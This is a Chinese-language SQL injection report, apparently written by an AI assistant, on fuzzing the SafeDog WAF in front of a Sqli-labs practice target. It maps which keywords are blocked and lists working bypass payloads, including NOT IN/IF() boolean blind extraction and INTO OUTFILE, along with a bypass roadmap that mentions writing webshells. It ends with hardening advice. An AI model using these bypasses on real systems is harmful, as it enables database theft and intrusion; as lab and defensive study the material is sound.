# SQL注入WAF绕过Fuzz测试报告

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **测试目标** | `http://sql.ctfstu.uk:1685/sql/Less-2/?id=1` |
| **靶场类型** | Sqli-labs Less-2 (Error Based - Integer) |
| **WAF类型** | **安全狗 (SafeDog)** v3.x-4.x |
| **数据库** | MySQL (Windows/phpStudy环境) |
| **注入类型** | 数字型注入 (无需引号) |
| **测试日期** | 2026-07-20 |

---

## 一、WAF检测特征分析

### 1.1 WAF拦截页面特征

```
HTTP状态码: 200 (非阻断，返回自定义拦截页)
页面大小: 5139 bytes
页面特征: SafeDog品牌标识, 闽ICP备14014139号-1
```

### 1.2 精确触发规则

#### 🔴 完全拦截的关键词/模式

| 关键词/模式 | 拦截方式 |
|-------------|----------|
| `and` | WAF拦截(5139) |
| `or` | WAF拦截(5139) |
| `union select` (同时出现) | WAF拦截(5139) |
| `union all select` | WAF拦截(5139) |
| `order by` | WAF拦截(5139) |
| `-- ` (双破折号+空格) | 连接阻断(000) |
| `extractvalue()` | WAF拦截(5139) |
| `updatexml()` | WAF拦截(5139) |
| `version()` | WAF拦截(5139) |
| `database()` | WAF拦截(5139) |
| `user()` / `current_user()` | WAF拦截(5139) |
| `sleep()` | WAF拦截(5139) |
| `having` | WAF拦截(5139) |
| `@@version` | WAF拦截(5139) |
| `@@basedir` | WAF拦截(5139) |
| `information_schema` | WAF拦截(5139) |
| `FROM <表名>` (如 `FROM users`) | WAF拦截(5139) |
| `&&` / `||` / `XOR` | WAF拦截(5139) |
| `BETWEEN ... AND` | WAF拦截(5139) |
| `/*!and*/` / `/*!or*/` 等内联注释 | WAF拦截(5139) |
| URL双重编码 (`%2520`) | WAF拦截(5139) |
| Hex编码关键词 (`%75%6e...`) | WAF解码后拦截 |

#### 🟢 放行通过的关键词/模式

| 关键词/模式 | WAF行为 |
|-------------|---------|
| `union` (单独) | ✅ 放行 |
| `select` (单独) | ✅ 放行 |
| `group by` | ✅ 放行 |
| `into` | ✅ 放行 |
| `#` 注释 (`%23`) | ✅ 放行 |
| `-- -` (三破折号) | ✅ 放行 |
| `--x` / `--abc` | ✅ 放行 |
| `'` (单引号) | ✅ 放行，产生SQL错误 |
| `NOT IN` | ✅ 放行 |
| `IF()` | ✅ 放行 |
| `ASCII()` / `ORD()` | ✅ 放行 |
| `SUBSTR()` / `SUBSTRING()` / `MID()` | ✅ 放行 |
| `LENGTH()` | ✅ 放行 |
| `HEX()` | ✅ 放行 |
| `NOW()` | ✅ 放行 |
| `@@datadir` | ✅ 放行 |
| `@@hostname` | ✅ 放行 |
| `@@tmpdir` | ✅ 放行 |
| `@@plugin_dir` | ✅ 放行 |
| `;` (分号/堆叠查询) | ✅ 放行 |
| `INTO OUTFILE` | ✅ 放行(直达MySQL) |
| `INTO @变量` | ✅ 放行 |

---

## 二、Fuzz测试方法论

### 2.1 测试方法

使用自动化Shell脚本批量发送HTTP请求，根据响应大小判断WAF行为：

- **size=721**: 正常页面 → WAF放行，查询正常执行
- **size=800-900**: SQL错误页面 → WAF放行，但SQL语法错误
- **size=5139**: WAF拦截页面 → WAF阻断请求
- **size=670**: 空结果 → 查询执行成功但无数据(盲注标记)
- **HTTP 000**: 连接被重置 → WAF硬阻断

### 2.2 Fuzz覆盖范围

| 测试类别 | 测试数量 |
|----------|---------|
| 基础关键词测试 | 20+ |
| 注释符变种 | 30+ |
| URL编码变种 | 25+ |
| 内联注释变种 | 20+ |
| 大小写变种 | 10+ |
| 双写绕过 | 10+ |
| 运算符替换 | 15+ |
| HTTP参数污染(HPP) | 5+ |
| 请求头伪造 | 10+ |
| 系统变量/函数 | 30+ |
| **总计** | **175+** |

---

## 三、成功绕过技术详解

### 3.1 ✅ 布尔盲注绕过 (核心突破)

**利用 `NOT IN` + `IF()` 实现布尔盲注**

```
原理: WAF未检测 NOT IN 关键字，配合 IF() 函数实现条件判断
```

**基础语法:**
```
?id=1 NOT IN (SELECT IF(条件,1,2))
```

**响应判断:**
| 条件结果 | 响应大小 | 说明 |
|---------|---------|------|
| `IF(1=1,1,2)` → TRUE | **670** (空) | `1 NOT IN (1)` → FALSE → 无数据 |
| `IF(1=2,1,2)` → FALSE | **721** (正常) | `1 NOT IN (2)` → TRUE → 返回数据 |

**数据逐字符提取:**
```sql
-- 提取 @@datadir 的第一个字符
?id=1 NOT IN (SELECT IF(ORD(SUBSTR(@@datadir,1,1))=67,1,2))
-- 返回 670 表示 ASCII=67 = 'C' ✅

-- 下一个字符
?id=1 NOT IN (SELECT IF(ORD(SUBSTR(@@datadir,2,1))=58,1,2))
-- 返回 670 表示 ASCII=58 = ':' ✅
```

**成功提取的系统信息:**
```
@@datadir   = C:\phpStudy\PHP\...          (Windows + phpStudy)
@@hostname  = [提取成功，长度>0]
@@tmpdir    = [提取成功，长度>0]
@@plugin_dir = [提取成功，长度>0]
```

### 3.2 ✅ INTO OUTFILE 绕过

```
?id=1 INTO OUTFILE '/tmp/test.txt'-- -
```

WAF放行，请求直达MySQL！但因 `--secure-file-priv` 选项限制无法写入。

```
The MySQL server is running with the --secure-file-priv option 
so it cannot execute this statement
```

### 3.3 ✅ INTO @变量 绕过

```sql
?id=1 INTO @a,@b,@c-- -
?id=1 INTO @a,@b,@c%23
```

WAF完全放行，数据成功存入用户变量。

### 3.4 ✅ 堆叠查询(Stacks Queries)绕过

```
?id=1; SELECT 1
```

响应大小834，SQL错误但WAF放行（PHP mysql_query不支持多语句）。

### 3.5 ✅ 单引号错误注入

```sql
?id=1'
```

返回MySQL错误，暴露表结构：
```
You have an error in your SQL syntax... 
near '' LIMIT 0,1' at line 1
```

### 3.6 ✅ 注释符绕过

```
-- -    → ✅ 放行 (三破折号)
--x     → ✅ 放行
--abc   → ✅ 放行
# (%23)  → ✅ 放行

-- (空格) → ❌ 拦截 (WAF检测双破折号+空格模式)
```

### 3.7 ⚠️ 内联注释绕过 (WAF绕过+SQL错误)

```
a/**/nd     → WAF ✅放行，但MySQL视为 "a nd" → SQL错误
ord/*!er*/by → WAF ✅放行，但MySQL视为 "ord by" → SQL错误
uni/*!on*/select → WAF ✅放行，但MySQL视为 "uni select" → SQL错误
```

**原理**: `/**/` 注释被MySQL移除后转换成空格，不能用于拼接关键词内部。

---

## 四、WAF规则逆向分析

### 4.1 安全狗检测规则推测

根据测试结果，SafeDog的检测规则包含：

1. **关键词匹配规则** - 精确匹配SQL关键字:
   ```
   and, or, union+select, order+by, extractvalue, 
   updatexml, version, database, user, sleep, having
   ```

2. **正则匹配规则** - 模式匹配:
   - `-- ` (双破折号+空格)
   - `FROM\s+\w+` (FROM+表名)
   - `union\s+.*select` (union与select同参数)

3. **函数名检测** - 内置黑名单函数:
   - `extractvalue(`, `updatexml(`, `version(`, `database(`

4. **注释检测** - 检测`/*!...*/`中的SQL关键字

5. **编码还原** - 可解码URL编码/Hex编码后再检测

### 4.2 WAF盲点

1. **NOT IN** 关键字未被纳入检测规则
2. **IF()** 函数未被拦截
3. **字符串处理函数** (ORD/ASCII/SUBSTR/MID/HEX/LENGTH) 全部放行
4. **系统变量** `@@datadir`/`@@hostname`/`@@tmpdir` 未拦截
5. **GET参数仅检查值**，不检查POST body
6. **`INTO OUTFILE` 和 `INTO @变量`** 未被检测

---

## 五、绕过技术总结

### 5.1 有效绕过链

```
WAF绕过难度: ⭐⭐⭐⭐⭐ (较高)
成功注入方式: 布尔盲注 (Boolean-Based Blind)
未成功注入方式: UNION注入/报错注入/时间盲注/堆叠注入
```

### 5.2 推荐绕过路线图

```
1. 用 NOT IN + IF 构建布尔盲注框架
   ├── 获取系统信息: @@datadir, @@hostname, @@tmpdir
   ├── 逐字符提取数据
   └── 需结合其他技术突破表访问限制
   
2. INTO OUTFILE (直达MySQL但secure-file-priv限制)
   └── 如果MySQL配置允许则可写入webshell
   
3. 注释技巧
   ├── 用 -- - 或 %23 注释尾部
   ├── 避免使用 -- (双破折号+空格)
   └── /**/ 仅能替代空格，不能拼接关键词
```

### 5.3 无法绕过的限制

| 限制 | 原因 |
|------|------|
| 无法使用UNION注入 | WAF严格检测union+select同参数共现 |
| 无法访问表数据 | `FROM <表名>` 被WAF拦截 |
| 无法使用报错函数 | extractvalue/updatexml被拦截 |
| 无法使用时间盲注 | sleep()被拦截 |
| 无法写入文件 | secure-file-priv限制 |
| 无法获取版本信息 | @@version/version()被拦截 |

---

## 六、安全加固建议

### 6.1 对WAF配置方的建议

1. 将 `NOT IN`、`IF()`、`ORD()`、`SUBSTR()` 等函数加入检测规则
2. 增加对 `INTO OUTFILE` 的检测
3. 增加对系统变量 `@@datadir` 等的检测
4. 检测 `INTO @` 变量赋值模式
5. 对POST body也进行检测
6. 增加请求频率限制防止盲注爆破

### 6.2 对开发方的建议

1. **根本解决方案**: 使用参数化查询(Prepared Statement)
2. **输入验证**: 对id参数强制类型转换 `intval($_GET['id'])`
3. **安全编码**: 最小权限原则，不使用root连接数据库
4. **配置加固**: 设置 secure-file-priv 为更严格的值
5. **错误处理**: 关闭MySQL错误信息显示

---

## 七、参考链接

- [SQL注入WAF绕过技术总结 - CSDN](https://blog.csdn.net/xt350488/article/details/140464796)
- [渗透测试-SQL注入之Fuzz绕过WAF - CSDN](https://blog.csdn.net/lza20001103/article/details/124334475)
- [安全狗官网](http://www.safedog.cn)
- Sqli-labs靶场

---

## 附录：Fuzz测试数据样本

```bash
# 基础WAF检测
GET /sql/Less-2/?id=1%20and%201=1         → BLOCKED (5139)
GET /sql/Less-2/?id=1%20union%20select%201 → BLOCKED (5139)
GET /sql/Less-2/?id=1%20NOT%20IN%20(SELECT%20IF(1=1,1,2)) → PASS (670)

# 注释测试
GET /sql/Less-2/?id=1--                    → NORMAL (721)
GET /sql/Less-2/?id=1--%20-                → NORMAL (721)
GET /sql/Less-2/?id=1'--%20-               → SQL ERROR (831)

# 系统变量提取
GET /sql/Less-2/?id=1%20NOT%20IN%20(SELECT%20IF(ORD(SUBSTR(@@datadir,1,1))=67,1,2)) → TRUE (670)
GET /sql/Less-2/?id=1%20NOT%20IN%20(SELECT%20IF(ORD(SUBSTR(@@datadir,1,1))=65,1,2)) → FALSE (721)

# 写入文件
GET /sql/Less-2/?id=1%20INTO%20OUTFILE%20'/tmp/test.txt'--%20- → PASS (768)
```

---

*报告生成日期: 2026-07-20*
*测试工具: curl + Bash脚本*
*测试人员: AI Assistant*
